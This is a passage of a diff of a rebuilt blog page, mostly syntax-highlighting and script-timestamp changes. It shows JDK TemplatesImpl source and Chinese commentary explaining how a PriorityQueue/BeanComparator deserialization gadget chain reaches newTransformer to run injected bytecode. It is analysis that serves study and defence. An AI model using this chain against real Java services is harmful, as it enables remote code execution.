-</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> translet<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>InstantiationException e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            ErrorMsg err <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ErrorMsg<span style="color:#f92672">(</span>ErrorMsg<span style="color:#f92672">.</span><span style="color:#a6e22e">TRANSLET_OBJECT_ERR</span><span style="color:#f92672">,</span> _name<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> TransformerConfigurationException<span style="color:#f92672">(</span>err<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>IllegalAccessException e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            ErrorMsg err <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ErrorMsg<span style="color:#f92672">(</span>ErrorMsg<span style="color:#f92672">.</span><span style="color:#a6e22e">TRANSLET_OBJECT_ERR</span><span style="color:#f92672">,</span> _name<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> TransformerConfigurationException<span style="color:#f92672">(</span>err<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">defineTransletClasses</span>()
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throws</span> TransformerConfigurationException {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">defineTransletClasses</span><span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throws</span> TransformerConfigurationException <span style="color:#f92672">{</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (_bytecodes <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
-</span></span><span style="display:flex;"><span>            ErrorMsg err <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ErrorMsg(ErrorMsg.<span style="color:#a6e22e">NO_TRANSLET_CLASS_ERR</span>);
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> TransformerConfigurationException(err.<span style="color:#a6e22e">toString</span>());
-</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>_bytecodes <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            ErrorMsg err <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ErrorMsg<span style="color:#f92672">(</span>ErrorMsg<span style="color:#f92672">.</span><span style="color:#a6e22e">NO_TRANSLET_CLASS_ERR</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> TransformerConfigurationException<span style="color:#f92672">(</span>err<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        TransletClassLoader loader <span style="color:#f92672">=</span> (TransletClassLoader)
-</span></span><span style="display:flex;"><span>            AccessController.<span style="color:#a6e22e">doPrivileged</span>(<span style="color:#66d9ef">new</span> PrivilegedAction() {
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">run</span>() {
-</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> TransletClassLoader(ObjectFactory.<span style="color:#a6e22e">findClassLoader</span>(),_tfactory.<span style="color:#a6e22e">getExternalExtensionsMap</span>());
-</span></span><span style="display:flex;"><span>                }
-</span></span><span style="display:flex;"><span>            });
+</span></span><span style="display:flex;"><span>        TransletClassLoader loader <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>TransletClassLoader<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>            AccessController<span style="color:#f92672">.</span><span style="color:#a6e22e">doPrivileged</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> PrivilegedAction<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">run</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> TransletClassLoader<span style="color:#f92672">(</span>ObjectFactory<span style="color:#f92672">.</span><span style="color:#a6e22e">findClassLoader</span><span style="color:#f92672">(),</span>_tfactory<span style="color:#f92672">.</span><span style="color:#a6e22e">getExternalExtensionsMap</span><span style="color:#f92672">());</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">});</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> classCount <span style="color:#f92672">=</span> _bytecodes.<span style="color:#a6e22e">length</span>;
-</span></span><span style="display:flex;"><span>            _class <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[</span>classCount<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> classCount <span style="color:#f92672">=</span> _bytecodes<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            _class <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[</span>classCount<span style="color:#f92672">];</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (classCount <span style="color:#f92672">&gt;</span> 1) {
-</span></span><span style="display:flex;"><span>                _auxClasses <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
-</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>classCount <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                _auxClasses <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0; i <span style="color:#f92672">&lt;</span> classCount; i<span style="color:#f92672">++</span>) {
-</span></span><span style="display:flex;"><span>                _class<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> loader.<span style="color:#a6e22e">defineClass</span>(_bytecodes<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>);
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">final</span> Class superClass <span style="color:#f92672">=</span> _class<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>.<span style="color:#a6e22e">getSuperclass</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">;</span> i <span style="color:#f92672">&lt;</span> classCount<span style="color:#f92672">;</span> i<span style="color:#f92672">++)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                _class<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> loader<span style="color:#f92672">.</span><span style="color:#a6e22e">defineClass</span><span style="color:#f92672">(</span>_bytecodes<span style="color:#f92672">[</span>i<span style="color:#f92672">]);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">final</span> Class superClass <span style="color:#f92672">=</span> _class<span style="color:#f92672">[</span>i<span style="color:#f92672">].</span><span style="color:#a6e22e">getSuperclass</span><span style="color:#f92672">();</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>                <span style="color:#75715e">// Check if this is the main class</span>
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (superClass.<span style="color:#a6e22e">getName</span>().<span style="color:#a6e22e">equals</span>(ABSTRACT_TRANSLET)) {
-</span></span><span style="display:flex;"><span>                    _transletIndex <span style="color:#f92672">=</span> i;
-</span></span><span style="display:flex;"><span>                }
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>                    _auxClasses.<span style="color:#a6e22e">put</span>(_class<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>.<span style="color:#a6e22e">getName</span>(), _class<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>);
-</span></span><span style="display:flex;"><span>                }
-</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">// Check if this is the main class
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>superClass<span style="color:#f92672">.</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">().</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span>ABSTRACT_TRANSLET<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                    _transletIndex <span style="color:#f92672">=</span> i<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                    _auxClasses<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span>_class<span style="color:#f92672">[</span>i<span style="color:#f92672">].</span><span style="color:#a6e22e">getName</span><span style="color:#f92672">(),</span> _class<span style="color:#f92672">[</span>i<span style="color:#f92672">]);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (_transletIndex <span style="color:#f92672">&lt;</span> 0) {
-</span></span><span style="display:flex;"><span>                ErrorMsg err<span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ErrorMsg(ErrorMsg.<span style="color:#a6e22e">NO_MAIN_TRANSLET_ERR</span>, _name);
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> TransformerConfigurationException(err.<span style="color:#a6e22e">toString</span>());
-</span></span><span style="display:flex;"><span>            }
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">catch</span> (ClassFormatError e) {
-</span></span><span style="display:flex;"><span>            ErrorMsg err <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ErrorMsg(ErrorMsg.<span style="color:#a6e22e">TRANSLET_CLASS_ERR</span>, _name);
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> TransformerConfigurationException(err.<span style="color:#a6e22e">toString</span>());
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">catch</span> (LinkageError e) {
-</span></span><span style="display:flex;"><span>            ErrorMsg err <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ErrorMsg(ErrorMsg.<span style="color:#a6e22e">TRANSLET_OBJECT_ERR</span>, _name);
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> TransformerConfigurationException(err.<span style="color:#a6e22e">toString</span>());
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>_transletIndex <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                ErrorMsg err<span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ErrorMsg<span style="color:#f92672">(</span>ErrorMsg<span style="color:#f92672">.</span><span style="color:#a6e22e">NO_MAIN_TRANSLET_ERR</span><span style="color:#f92672">,</span> _name<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> TransformerConfigurationException<span style="color:#f92672">(</span>err<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>ClassFormatError e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            ErrorMsg err <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ErrorMsg<span style="color:#f92672">(</span>ErrorMsg<span style="color:#f92672">.</span><span style="color:#a6e22e">TRANSLET_CLASS_ERR</span><span style="color:#f92672">,</span> _name<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> TransformerConfigurationException<span style="color:#f92672">(</span>err<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>LinkageError e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            ErrorMsg err <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ErrorMsg<span style="color:#f92672">(</span>ErrorMsg<span style="color:#f92672">.</span><span style="color:#a6e22e">TRANSLET_OBJECT_ERR</span><span style="color:#f92672">,</span> _name<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> TransformerConfigurationException<span style="color:#f92672">(</span>err<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
 </span></span></code></pre></div><p>所以可以总结:<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>的<code>_bytecodes</code>属性可以包含类的字节码，通过<code>newTransformer</code>方法可以调用字节码对应类的构造函数或者静态函数。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">TemplatesImpl</span> <span style="color:#66d9ef">implements</span> Templates, Serializable {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">long</span> serialVersionUID <span style="color:#f92672">=</span> 673094361519270707L;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">static</span> String DESERIALIZE_TRANSLET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;jdk.xml.enableTemplatesImplDeserialization&#34;</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">TemplatesImpl</span> <span style="color:#66d9ef">implements</span> Templates<span style="color:#f92672">,</span> Serializable <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">long</span> serialVersionUID <span style="color:#f92672">=</span> <span style="color:#ae81ff">673094361519270707L</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">static</span> String DESERIALIZE_TRANSLET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;jdk.xml.enableTemplatesImplDeserialization&#34;</span><span style="color:#f92672">;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/**
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Name of the superclass of all translets. This is needed to     * determine which, among all classes comprising a translet,     * is the main one.     */</span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> String ABSTRACT_TRANSLET
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;</span><span style="color:#f92672">;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/**
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Name of the main class or default name if unknown.     */</span>    <span style="color:#66d9ef">private</span> String _name <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Name of the main class or default name if unknown.     */</span>    <span style="color:#66d9ef">private</span> String _name <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/**
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Contains the actual class definition for the translet class and     * any auxiliary classes.     */</span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span> _bytecodes <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Contains the actual class definition for the translet class and     * any auxiliary classes.     */</span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span> _bytecodes <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
 </span></span></code></pre></div><p>总结一下过程：PriorityQueue对象在反序列化过程中会触发排序，调用comparator.compare，在BeanComparator.compare方法中会尝试获取类的property对应的成员的值，其方法是通过尝试获取成员值对应的getter方法，而后调用这个getter方法。</p>
 <p>而TemplatesImpl类的_bytecodes可以存储字节码并且可以通过newTransformer方法调用这个字节码对应类的构造函数或者静态方法，TemplatesImpl类的getOutputProperties方法会调用newTransformer方法。</p>
 <p>而getOutputProperties在规范中对应于outputProperties的getter方法，最终构成反序列化链。</p>
@@ -3279,6 +3317,22 @@
             
         
                     
+            
+        
+                    
+                        
+            
+            
+                
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
                         
             
             
@@ -3295,9 +3349,6 @@
             
         
                     
-            
-        
-                    
                         
             
             
@@ -3310,6 +3361,9 @@
                     
                     
 
+                    
+            
+        
                     
             
         
@@ -4211,19 +4265,19 @@
     <div style="left: -1000px; overflow: scroll; position: absolute; top: -1000px; border: none; box-sizing: content-box; height: 200px; margin: 0px; padding: 0px; width: 200px;">
       <div style="border: none; box-sizing: content-box; height: 200px; margin: 0px; padding: 0px; width: 200px;"></div>
     </div>
-    <script src="/js/clipboard.min.js?1712424309"></script>
-    <script src="/js/perfect-scrollbar.min.js?1712424309"></script>
-    <script src="/js/perfect-scrollbar.jquery.min.js?1712424309"></script>
-    <script src="/js/jquery.sticky.js?1712424309"></script>
-    <script src="/js/featherlight.min.js?1712424309"></script>
-    <script src="/js/highlight.pack.js?1712424309"></script>
+    <script src="/js/clipboard.min.js?1713376033"></script>
+    <script src="/js/perfect-scrollbar.min.js?1713376033"></script>
+    <script src="/js/perfect-scrollbar.jquery.min.js?1713376033"></script>
+    <script src="/js/jquery.sticky.js?1713376033"></script>
+    <script src="/js/featherlight.min.js?1713376033"></script>
+    <script src="/js/highlight.pack.js?1713376033"></script>
     <script>hljs.initHighlightingOnLoad();</script>
-    <script src="/js/modernizr.custom-3.6.0.js?1712424309"></script>
-    <script src="/js/learn.js?1712424309"></script>
-    <script src="/js/hugo-learn.js?1712424309"></script>
+    <script src="/js/modernizr.custom-3.6.0.js?1713376033"></script>
+    <script src="/js/learn.js?1713376033"></script>
+    <script src="/js/hugo-learn.js?1713376033"></script>
     
         
-            <script src="/mermaid/mermaid.js?1712424309"></script>
+            <script src="/mermaid/mermaid.js?1713376033"></script>
         
         <script>
             mermaid.initialize({ startOnLoad: true });
